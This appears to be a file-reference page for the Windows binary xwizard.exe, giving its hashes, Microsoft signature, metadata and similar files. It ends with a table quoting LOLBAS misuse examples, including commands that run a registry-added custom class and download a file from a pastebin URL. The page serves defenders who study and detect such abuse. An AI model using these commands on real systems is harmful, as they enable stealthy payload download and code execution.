---
title: xwizard.exe | Extensible Wizards Host Process
excerpt: What is xwizard.exe?
---

# xwizard.exe 

* File Path: `C:\Windows\SysWOW64\xwizard.exe`
* Description: Extensible Wizards Host Process

## Hashes

Type | Hash
-- | --
MD5 | `3C70F039EE4C07511ABD82B5664FB91B`
SHA1 | `52C040C88F8D7653BEB0F85F82BA610AF73C99B9`
SHA256 | `16065D6FA9502FE13E8FC1E8ED2FC07842F33E45D19C369C721DFCAD9AEF5A28`
SHA384 | `877B50C4F0DD63F63DFFFAA08BEFDB8D2F234DB2F37467F27801E973F02008F0BD12098E033F6286ECD3CA8888677640`
SHA512 | `979DE327D129C2272781812D3AE03A8FB7A9CB52C3E41A13078992E9B9E7DB45AC6B5232A81B57C1109B9B12FD5E552AFB5B0A84860AE08B1ED2C1951F60E69D`
SSDEEP | `768:o5ObzBwv/bqaWLtpJwzh/rIo8YeTWs2IkRDzsq4ytZZZL2YCX4ib:o4KvGaiwVTIo18URDoq4OZZZLlCIib`

## Signature

* Status: Signature verified.
* Serial: `33000000BCE120FDD27CC8EE930000000000BC`
* Thumbprint: `E85459B23C232DB3CB94C7A56D47678F58E8E51E`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: xwizard.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.14393.0 (rs1_release.160715-1616)
* Product Version: 10.0.14393.0
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## File Similarity (ssdeep match)

File | Score
-- | --
[C:\Windows\system32\ComputerDefaults.exe](ComputerDefaults.exe-3F032A1BDF4D7DF2F43FE7C0410AC175.md) | 57
[C:\WINDOWS\system32\ComputerDefaults.exe](ComputerDefaults.exe-495F18535BBBA007A18EC5EE708318FE.md) | 52
[C:\Windows\system32\ComputerDefaults.exe](ComputerDefaults.exe-AC4C3945A3E6DFFF98145096DA4EDA93.md) | 49
[C:\windows\system32\ComputerDefaults.exe](ComputerDefaults.exe-C18B586CA8F414A47D9CBA263361692B.md) | 69
[C:\Windows\system32\ComputerDefaults.exe](ComputerDefaults.exe-D25A9E160E3B74EF2242023726F15416.md) | 52
[C:\Windows\system32\xwizard.exe](xwizard.exe-10B8BDC83EF7CFBBD344F2587453AD29.md) | 54
[C:\windows\system32\xwizard.exe](xwizard.exe-2AFA70B713D8AF4279C9FDAE7AD08A9D.md) | 58
[C:\Windows\system32\xwizard.exe](xwizard.exe-30C784340F42DB44A84C7958C240E394.md) | 49
[C:\WINDOWS\system32\xwizard.exe](xwizard.exe-30D89280E86DFB29C2F232194642125E.md) | 50
[C:\Windows\system32\xwizard.exe](xwizard.exe-C0CCC55F9E988ACB8B624EFD0EC8B92B.md) | 58
[C:\windows\SysWOW64\ComputerDefaults.exe](ComputerDefaults.exe-1A506E36A76AD897490E77313CD3259A.md) | 63
[C:\WINDOWS\SysWOW64\ComputerDefaults.exe](ComputerDefaults.exe-455CCBB47F4BEF02A9E0034859CE59E2.md) | 50
[C:\Windows\SysWOW64\ComputerDefaults.exe](ComputerDefaults.exe-4A007FCF54D0379B75D1FA50F840D62B.md) | 68
[C:\Windows\SysWOW64\ComputerDefaults.exe](ComputerDefaults.exe-CFA65B13918526579371C138108A7DDB.md) | 55
[C:\Windows\SysWOW64\ComputerDefaults.exe](ComputerDefaults.exe-FF2E0EABBB610CD9D4F06C8C0E33B92F.md) | 50
[C:\Windows\SysWOW64\xwizard.exe](xwizard.exe-759CF84292251AB50E1791CBC0C4E8C5.md) | 63
[C:\windows\SysWOW64\xwizard.exe](xwizard.exe-7E421CBAF3DB19860413EC55C5B03F61.md) | 58
[C:\Windows\SysWOW64\xwizard.exe](xwizard.exe-8581F29C5F84B72C053DBCC5372C5DB6.md) | 61
[C:\WINDOWS\SysWOW64\xwizard.exe](xwizard.exe-CB72CA2B130AA4B776FAF32E18453CF6.md) | 63

## Possible Misuse

*The following table contains possible examples of `xwizard.exe` being misused. While `xwizard.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `Name: Xwizard.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `- Command: xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `Description: Xwizard.exe running a custom class that has been added to the registry.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `- Command: xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `Description: Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `- Command: xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `Description: Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file.` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `- Path: C:\Windows\System32\xwizard.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Xwizard.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Xwizard.yml) | `- Path: C:\Windows\SysWOW64\xwizard.exe` | 



MIT License. Copyright (c) 2020 Strontic.


